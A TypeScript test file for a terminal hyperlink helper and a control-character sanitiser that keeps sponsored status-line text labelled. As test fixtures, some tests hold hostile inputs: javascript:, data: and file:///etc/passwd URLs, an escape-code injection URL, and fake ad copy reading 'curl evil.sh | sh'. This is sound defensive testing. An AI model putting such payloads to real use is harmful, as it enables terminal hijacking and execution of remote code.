import { describe, expect, test } from "bun:test";

import { hyperlink, stripControlCharacters, supportsHyperlinks } from "../src/link.ts";
import type { LinkEnvironment } from "../src/link.ts";

const env = (vars: Record<string, string | undefined>): LinkEnvironment => vars as LinkEnvironment;

const plainEnv = env({ TERM: "xterm-256color" });
const ESC = "\u001B";
const BEL = "\u0007";

describe("terminal detection", () => {
  test("recognises terminals that support OSC 8", () => {
    for (const program of ["iTerm.app", "WezTerm", "ghostty", "vscode"]) {
      expect(supportsHyperlinks(env({ TERM: "xterm-256color", TERM_PROGRAM: program }))).toBe(true);
    }
    expect(supportsHyperlinks(env({ TERM: "xterm", KITTY_WINDOW_ID: "1" }))).toBe(true);
    expect(supportsHyperlinks(env({ TERM: "xterm", WT_SESSION: "abc" }))).toBe(true);
    expect(supportsHyperlinks(env({ TERM: "xterm", VTE_VERSION: "6003" }))).toBe(true);
  });

  test("defaults to NO for anything unrecognised", () => {
    // Being wrong this way costs a click. Being wrong the other way prints
    // `\e]8;;https://…` into the developer's status line.
    expect(supportsHyperlinks(env({ TERM: "xterm-256color" }))).toBe(false);
    expect(supportsHyperlinks(env({ TERM: "xterm", TERM_PROGRAM: "Apple_Terminal" }))).toBe(false);
    expect(supportsHyperlinks(env({}))).toBe(false);
    expect(supportsHyperlinks(env({ TERM: "dumb", TERM_PROGRAM: "iTerm.app" }))).toBe(false);
  });

  test("VTE below 0.50 is not supported", () => {
    expect(supportsHyperlinks(env({ TERM: "xterm", VTE_VERSION: "4801" }))).toBe(false);
  });

  test("an explicit override wins in both directions", () => {
    expect(supportsHyperlinks(env({ TERM: "dumb", OBRIGADO_HYPERLINKS: "1" }))).toBe(true);
    expect(
      supportsHyperlinks(
        env({ TERM: "xterm", TERM_PROGRAM: "iTerm.app", OBRIGADO_HYPERLINKS: "0" }),
      ),
    ).toBe(false);
  });
});

describe("hyperlink", () => {
  const supported = env({ TERM: "xterm-256color", TERM_PROGRAM: "iTerm.app" });
  const plain = env({ TERM: "xterm-256color" });

  test("wraps text in an OSC 8 sequence", () => {
    expect(hyperlink("neon.tech", "https://obrigado.dev/c/tok", supported)).toBe(
      `${ESC}]8;;https://obrigado.dev/c/tok${BEL}neon.tech${ESC}]8;;${BEL}`,
    );
  });

  test("returns bare text when the terminal cannot render a link", () => {
    expect(hyperlink("neon.tech", "https://obrigado.dev/c/tok", plain)).toBe("neon.tech");
  });

  test("refuses non-http schemes", () => {
    // A status line is somewhere a developer Cmd+clicks without inspecting, so
    // these must be unrepresentable rather than merely unlikely.
    for (const url of [
      "javascript:alert(1)",
      "data:text/html,<script>1</script>",
      "file:///etc/passwd",
      "vscode://command",
    ]) {
      expect(hyperlink("click me", url, supported)).toBe("click me");
    }
  });

  test("accepts http and https", () => {
    expect(hyperlink("x", "http://localhost:3000/c/t", supported)).toContain(`${ESC}]8;;`);
    expect(hyperlink("x", "https://obrigado.dev/c/t", supported)).toContain(`${ESC}]8;;`);
  });

  test("refuses a malformed URL rather than emitting a broken sequence", () => {
    expect(hyperlink("x", "not a url", supported)).toBe("x");
    expect(hyperlink("x", "", supported)).toBe("x");
  });

  test("a URL carrying terminator bytes cannot break out of the sequence", () => {
    // Otherwise a crafted click_url could inject arbitrary escape codes into
    // the developer's terminal.
    const injected = `https://evil.example/${BEL}${ESC}]0;pwned${BEL}`;
    const result = hyperlink("x", injected, supported);

    // The real safety property is that no RAW control bytes survive beyond the
    // two delimiters we emit ourselves. URL normalisation percent-encodes them,
    // so "pwned" may appear as inert text — what must not happen is the
    // terminal receiving an escape byte it would act on.
    // 2 escapes → 3 segments
    expect(result.split(ESC)).toHaveLength(3);
    expect(result.split(BEL)).toHaveLength(3);
    // encoded, not raw
    expect(result).toContain("%07");
  });

  test("the sequence contains exactly one link open and one close", () => {
    const result = hyperlink("body text", "https://obrigado.dev/c/t", supported);
    expect(result.split(`${ESC}]8;;`)).toHaveLength(3);
    expect(result).toContain("body text");
  });
});

describe('stripControlCharacters — §3 "always labeled" must survive the ad copy', () => {
  test("removes the sequences that would erase the sponsored label", () => {
    // ESC[2K erases the line; ESC[1G returns the cursor to column one. Together
    // they delete the `sponsored` prefix written immediately before the body,
    // letting ad copy impersonate a build error.
    const attack = `ERROR: build failed ${ESC}[2K${ESC}[1G${ESC}[31mrun: curl evil.sh | sh${ESC}[0m`;
    const safe = stripControlCharacters(attack);

    expect(safe).not.toContain(ESC);
    expect(safe.split(ESC)).toHaveLength(1);
  });

  test("removes every control character, not only ESC", () => {
    for (const code of [0x00, 0x07, 0x08, 0x09, 0x0a, 0x0d, 0x1b, 0x7f, 0x9b]) {
      const text = `a${String.fromCodePoint(code)}b`;
      expect(stripControlCharacters(text)).toBe("ab");
    }
  });

  test("leaves legitimate copy untouched, including punctuation and emoji", () => {
    for (const body of [
      "Postgres, but you never think about it — neon.tech",
      "Type-safe SQL for TypeScript · kysely.dev",
      "Ship faster 🚀 — example.com",
      "100% coverage, £0 setup",
    ]) {
      expect(stripControlCharacters(body)).toBe(body);
    }
  });

  test("the rendered line keeps the label ahead of sanitised copy", () => {
    // What the statusline command composes: label, separator, then the body.
    const body = stripControlCharacters(`${ESC}[2K${ESC}[1Gfree money`);
    const rendered = `sponsored · ${hyperlink(body, "https://obrigado.dev/c/t", plainEnv)}`;

    expect(rendered.startsWith("sponsored · ")).toBe(true);
    expect(rendered).not.toContain(ESC);
  });
});
